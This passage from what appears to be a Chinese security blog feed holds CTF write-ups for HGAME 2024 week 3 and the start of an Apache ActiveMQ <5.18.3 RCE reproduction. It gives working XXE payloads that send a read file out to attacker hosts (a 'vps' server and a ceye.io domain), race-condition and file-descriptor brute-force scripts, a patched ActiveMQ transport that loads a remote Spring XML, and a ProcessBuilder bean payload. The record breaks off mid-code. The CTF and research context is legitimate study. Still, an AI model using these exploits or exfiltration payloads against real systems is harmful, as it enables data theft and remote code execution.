class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);    <span class="hljs-keyword">return</span>;  &#125;  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;home&quot;</span>, &#123;    <span class="hljs-attr">username</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>,    <span class="hljs-attr">strategy</span>: (<span class="hljs-function">(<span class="hljs-params">list</span>)=&gt;</span>&#123;      <span class="hljs-keyword">var</span> result = [];      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> list) &#123;        result.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">host</span>: key, <span class="hljs-attr">allow</span>: list[key]&#125;);      &#125;      <span class="hljs-keyword">return</span> result;    &#125;)(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">strategy</span>),  &#125;);&#125;);<span class="hljs-comment">// demo service behind webvpn</span>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">if</span> (    req.<span class="hljs-property">headers</span>.<span class="hljs-property">host</span> != <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span> ||    req.<span class="hljs-property">hostname</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> ||    req.<span class="hljs-property">ip</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span>   ) &#123;    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">400</span>);    <span class="hljs-keyword">return</span>;  &#125;  <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);  res.<span class="hljs-title function_">send</span>(data);&#125;);app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`app listen on <span class="hljs-subst">$&#123;port&#125;</span>`</span>);&#125;);</code></pre></div><p><img src="/../images/HGAME-week3/image-20240216030153830.png" alt="image-20240216030153830"></p><p>这里也sb了一下，Content-Type没改为application&#x2F;json，一直无法污染，我还以为思路有问题呢</p><p><img src="/../images/HGAME-week3/image-20240216030019744.png" alt="image-20240216030019744"></p><p>不知道为什么，我明明开始就是这么做的，但是它一直显示<code>unreachable url</code></p><p>然后我就污染了<code>127.0.0.1:3000</code>、<code>127.0.0.1:3000/flag</code>等等都不行</p><p>最后第二天再次尝试，只污染了个<code>127.0.0.1</code>就行了</p><h2 id="vidarbox"><a href="#vidarbox" class="headerlink" title="vidarbox"></a>vidarbox</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">workdir</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;file:///non_exists/&quot;</span>;<span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.xml&quot;</span>;<span class="hljs-meta">@RequestMapping(&quot;/&quot;)</span><span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index.html&quot;</span>;&#125;<span class="hljs-meta">@GetMapping(&#123;&quot;/backdoor&quot;&#125;)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> String <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String fname)</span> <span class="hljs-keyword">throws</span> IOException, SAXException &#123;    <span class="hljs-type">DefaultResourceLoader</span> <span class="hljs-variable">resourceLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultResourceLoader</span>();    <span class="hljs-type">byte</span>[] content = resourceLoader.getResource(<span class="hljs-built_in">this</span>.workdir + fname + <span class="hljs-built_in">this</span>.suffix).getContentAsByteArray();    <span class="hljs-keyword">if</span> (content != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.safeCheck(content)) &#123;        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();        reader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(content)));        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;    &#125;&#125;<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">safeCheck</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] stream)</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stream);    <span class="hljs-keyword">return</span> !content.contains(<span class="hljs-string">&quot;DOCTYPE&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;ENTITY&quot;</span>) &amp;&amp;            !content.contains(<span class="hljs-string">&quot;doctype&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;entity&quot;</span>);&#125;</code></pre></div><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>当时看WP时都看不懂，问了下出题人</p><p>file协议支持ftp，用<code>python -m http.server</code>是不行的</p><p>**file协议对应有一个类似http的远程访问，就是<code>ftp协议</code>，即<code>文件传输协议</code>**。</p><p>所以这里我们要用ftp服务器</p><p>使用WP中给出的代码</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer<span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler<span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServerauthorizer = DummyAuthorizer()authorizer.add_anonymous(&quot;你的vps所开放的目录&quot;, perm=&quot;r&quot;)<span class="hljs-keyword">handler</span> = FTPHandler<span class="hljs-keyword">handler</span>.authorizer = authorizer<span class="hljs-keyword">server</span> = FTPServer((&quot;0.0.0.0&quot;, <span class="hljs-number">21</span>), <span class="hljs-keyword">handler</span>)<span class="hljs-keyword">server</span>.serve_forever()</code></pre></div><h4 id="接下来的说法可能具有主观性，因为问了出题人，他说WP没问题"><a href="#接下来的说法可能具有主观性，因为问了出题人，他说WP没问题" class="headerlink" title="接下来的说法可能具有主观性，因为问了出题人，他说WP没问题"></a>接下来的说法可能具有主观性，因为问了出题人，他说WP没问题</h4><p>但是我认为两个恶意文件其实是有问题的</p><p><img src="/../images/HGAME-week3/image-20240226225755267.png" alt="image-20240226225755267"></p><p>首先这里是ftp的服务，要使用ftp协议进行请求（当然你要是为了evil.dtd单独开了一个<code>python -m http.server</code>就当我没说</p><p>其次这里定义实体也是错误的，应该用ENTITY，而不是DOCTYPE （有可能是我狭隘了，没见过这种写法</p><p>我的恶意文件</p><p>payload.xml</p><div class="code-wrapper"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-16BE&quot;</span> ?&gt;</span></span><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">try</span> [</span></span><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;ftp://vps/evil.dtd&quot;</span>&gt;</span></span></span><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%int;</span><span class="language-xml"><span class="hljs-meta"></span></span><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%all;</span><span class="language-xml"><span class="hljs-meta"></span></span><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><span class="hljs-meta"><span class="language-xml">]&gt;</span></span></code></pre></div><p>生成文件</p><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">FileOutputStream fileOutputStream = new FileOutputStream(&quot;payload.xml&quot;);</span><span class="language-xml">fileOutputStream.write(&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?</span>xml version=\<span class="hljs-string">&quot;1.0\&quot; encoding=\&quot;UTF-16BE\&quot; ?&gt;</span></span><span class="language-xml">\n<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">try</span> [\n<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-keyword">SYSTEM</span> \<span class="hljs-string">&quot;ftp://vps/evil.dtd\&quot;&gt;\n%int;\n%all;\n%send;\n]&gt;&quot;</span>.getBytes(<span class="hljs-keyword">StandardCharsets</span>.<span class="hljs-keyword">UTF_16BE</span>));</span></span></span><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">fileOutputStream</span>.close();</span></span></span></code></pre></div><p>evil.dtd</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:7777/?%payl;&#x27;&gt;&quot;</span>&gt;</span></code></pre></div><p><img src="/../images/HGAME-week3/image-20240226224938676.png" alt="image-20240226224938676"></p><h4 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h4><p><img src="/../images/HGAME-week3/image-20240226232648802.png" alt="image-20240226232648802"></p><p>大家各自尝试吧，毕竟说的再多，只有自己试出来的才是自己相信的</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><a href="https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89">https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup&#x2F;#chatterbox%EF%BC%88solved%EF%BC%89</a></p><p><a href="https://chenxi9981.github.io/hgame2024_week3/">hgame2024_week3 WP | 晨曦的个人小站 (chenxi9981.github.io)</a></p><p>太强了，Boogipop大佬的文章当时就瞄了几眼，只能说没有体悟（遇到这里联想不到那个做法啊</p><p>但晨曦师傅好敏锐的嗅觉，好啊</p><p>连file协议都一模一样</p><p>条件竞争上传脚本</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> threadingurl = <span class="hljs-string">&#x27;http://139.196.183.57:32517/&#x27;</span> <span class="hljs-comment">#引入url</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        response=requests.post(url,files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;poc&#x27;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.xml&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>))&#125;)        <span class="hljs-comment">#print(response.text)</span><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:        evnet=threading.Event()        <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):                threading.Thread(target=write).start()        evnet.<span class="hljs-built_in">set</span>()</code></pre></div><p>包含文件描述符</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>, <span class="hljs-number">35</span>):        <span class="hljs-keyword">try</span>:            <span class="hljs-comment">#print(i)</span>            url = <span class="hljs-string">f&#x27;http://139.196.183.57:32517/backdoor?fname=..%5cproc/self/fd/<span class="hljs-subst">&#123;i&#125;</span>%23&#x27;</span>  <span class="hljs-comment"># 引入url</span>            <span class="hljs-comment"># print(r.cookies)</span>            response = requests.get(url,timeout=<span class="hljs-number">0.5</span>)                        <span class="hljs-built_in">print</span>(i,response.text)            <span class="hljs-keyword">if</span> response.text == <span class="hljs-string">&#x27;success&#x27;</span> <span class="hljs-keyword">or</span> response.text == <span class="hljs-string">&#x27;error&#x27;</span>:                <span class="hljs-built_in">print</span>(i,response.text)                time.sleep(<span class="hljs-number">10</span>)        <span class="hljs-keyword">except</span>:            <span class="hljs-keyword">pass</span>            <span class="hljs-comment">#print(&quot;no&quot;)</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-16&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span></span><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://[ip]:[port]/test.dtd&quot;</span>&gt;</span></span></span><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="hljs-meta"></span></span><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%all;</span><span class="language-xml"><span class="hljs-meta"></span></span><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://kbqsag.ceye.io?file=%file;&#x27;&gt;&quot;</span>&gt;</span></code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>学习ActiveMQ小于5.18.3的RCE</title>
    <link href="/2024/02/09/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/"/>
    <url>/2024/02/09/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-ActiveMQ"><a href="#Apache-ActiveMQ" class="headerlink" title="Apache ActiveMQ&lt;5.18.3的RCE"></a>Apache ActiveMQ&lt;5.18.3的RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再写春秋杯Active-takeaway时遇到ActiveMQ，来复现一下，之前只是粗略的看了下文章</p><p>学习就应该这样，刷题-&gt;不会-&gt;看WP-&gt;深入了解，但我真刷题太少了</p><p>复现的是<a href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>了解下概念</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031227613.png" alt="image-20240209031227613"></p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209031114440.png" alt="image-20240209031114440"></p><p>爆出一个项目有漏洞后，找漏洞点最好的方式就是去diff，看看官方是咋修补的</p><p><a href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p><p><a href="https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java">https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java</a></p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209015429655.png" alt="image-20240209015429655"></p><p>发现可以实例化任意构造器，并传入String类的参数</p><p>看一下这个类结构</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024630931.png" alt="image-20240209024630931"></p><p>有若干 Marshal&#x2F;unmarshal 方法     （即序列化和反序列化</p><p>找一下调用漏洞函数的部分</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024904937.png" alt="image-20240209024904937"></p><p>有两处地方调用了这个函数</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024942697.png" alt="image-20240209024942697"></p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209024953849.png" alt="image-20240209024953849"></p><p>这里以tightUnmarsalThrowable为例</p><p>会通过反序列化获取 clazz 和 message, 然后调用 createThrowable</p><p>找到与tightUnmarsalThrowable对应的tightMarshalThrowable</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240209025700540.png" alt="image-20240209025700540"></p><p>文章的前文提到</p><blockquote><p>经过简单的搜索可以发现 ExceptionResponseMarshaller 这个类, 它是 BaseDataStreamMarshaller 的子类</p><p>其 tightUnmarshal&#x2F;looseUnmarshal 方法会调用 tightMarshalThrowable&#x2F;looseMarshalThrowable, 最终调用到 BaseDataStreamMarshaller 的 createThrowable 方法</p></blockquote><p>。。。6</p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.apache.activemq.command;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExceptionResponse</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Response</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span> DATA_STRUCTURE_TYPE = <span class="hljs-number">31</span>;    Throwable exception;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExceptionResponse</span><span class="hljs-params">()</span> </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExceptionResponse</span><span class="hljs-params">(Throwable e)</span> </span>&#123;        <span class="hljs-keyword">this</span>.setException(e);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">byte</span> <span class="hljs-title">getDataStructureType</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">31</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function">Throwable <span class="hljs-title">getException</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.exception;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setException</span><span class="hljs-params">(Throwable exception)</span> </span>&#123;        <span class="hljs-keyword">this</span>.exception = exception;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isException</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;&#125;</code></pre></div><p>回到上面</p><p>o 就是 ExceptionResponse 里面的 exception 字段 (继承了 Throwable), 然后分别将 o 的 className 和 message 写入序列化流</p><p>到这里思路其实已经差不多了, 我们只需要构造一个 ExceptionResponse 然后发给 ActiveMQ 服务器, 之后 ActiveMQ 会自己调用 unmarshal, 最后触发 createThrowable</p><p>下面只需要关注如何发送 ExceptionResponse 即可</p><p>只能说太强了</p><p>写一个发送信息的demo</p><div class="code-wrapper"><pre><code class="hljs pgsql">package com.example;<span class="hljs-keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;<span class="hljs-keyword">import</span> javax.jms.*;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Demo &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;        ConnectionFactory connectionFactory = <span class="hljs-built_in">new</span> ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);        <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span> = connectionFactory.createConnection();        <span class="hljs-keyword">connection</span>.<span class="hljs-keyword">start</span>();        <span class="hljs-keyword">Session</span> <span class="hljs-keyword">session</span> = <span class="hljs-keyword">connection</span>.createSession();        Destination destination = <span class="hljs-keyword">session</span>.createQueue(&quot;tempQueue&quot;);        MessageProducer producer = <span class="hljs-keyword">session</span>.createProducer(destination);        Message message = <span class="hljs-keyword">session</span>.createObjectMessage(&quot;123&quot;);        producer.send(message);        <span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>();    &#125;&#125;</code></pre></div><p>然后随便打几个断点</p><p>在一次通信的过程中 ActiveMQ 会 marshal &#x2F; unmarshal 一些其它的数据, 调试的时候记得判断)</p><p><code>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal()</code></p><p>这里会获取dataType，然后根据它的值去获取对应的序列化器</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021631594.png" alt="image-20240210021631594"></p><p>在 demo 中我们发送的是一个 ObjectMessage (ActiveMQObjectMessage) 对象, 它的 dataType 是 26</p><p>而 ExceptionResponse 的 dataType 是 31, 对应上图中的 ExceptionResponseMarshaller</p><p>获取到了对应的序列化器之后, 会调用它的 tightUnmarshal &#x2F; looseUnmarshal 方法进一步处理 Message 内容</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210021838401.png" alt="image-20240210021838401"></p><p>不能修改 ObjectMessage 的 <code>DATA_STRUCTURE_TYPE</code> 字段, 把它改成 31 然后发送</p><p> 因为对于不同的 Message 类型, 序列化器会单独进行处理, 比如调用 writeXXX 和 readXXX 的类型和次数都不一样</p><p>我们应该发送一个经由这个 ExceptionResponseMarshaller 处理的 ExceptionResponse</p><p>这里X1r0z师傅的非常厉害，因为要doUnmarshal中readByte获取dataType</p><p>所以在marshal中下断点，调试client端</p><p>然后在调用栈中往前找到了TcpTransport类</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022735896.png" alt="image-20240210022735896"></p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210022624732.png" alt="image-20240210022624732"></p><p>它的 oneway 方法会调用 wireFormat.marshal() 去序列化 command</p><p>command 就是前面准备发送的 ObjectMessage, 而 wireFormat 就是和它对应的序列化器</p><p>那么我们只需要手动 patch 这个方法, 将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可</p><p>这里师傅没管OpenWire 协议，直接在当前源码目录重写了TcpTransport类的逻辑</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">oneway</span><span class="hljs-params">(Object command)</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-built_in">this</span>.checkStarted();    <span class="hljs-type">Throwable</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);    <span class="hljs-type">ExceptionResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionResponse</span>(obj);   <span class="hljs-built_in">this</span>.wireFormat.marshal(response, <span class="hljs-built_in">this</span>.dataOut);    <span class="hljs-built_in">this</span>.dataOut.flush();&#125;</code></pre></div><p>然后是 createThrowable 方法的利用, 这块其实跟 PostgreSQL JDBC 的利用类似, 因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 <code>ClassPathXmlApplicationContext</code> 加载 XML 实现 RCE</p><p>因为在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p><p>大佬的思路总是惊为天人</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240210023057935.png" alt="image-20240210023057935"></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h2 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h2><p>复现春秋杯时，看Boogipop大佬WP给出一个链接</p><p><a href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p><p>也谈了对这个rce的理解</p><p>正常场景下，生产者只能发送Message给Broker。为了发送Response给Broker肯定需要修改下ActiveMQ的代码，所以大部分利用都是修改代码实现的。</p><p>然后作者查看了Activemq的协议，给出了攻击代码</p><div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span 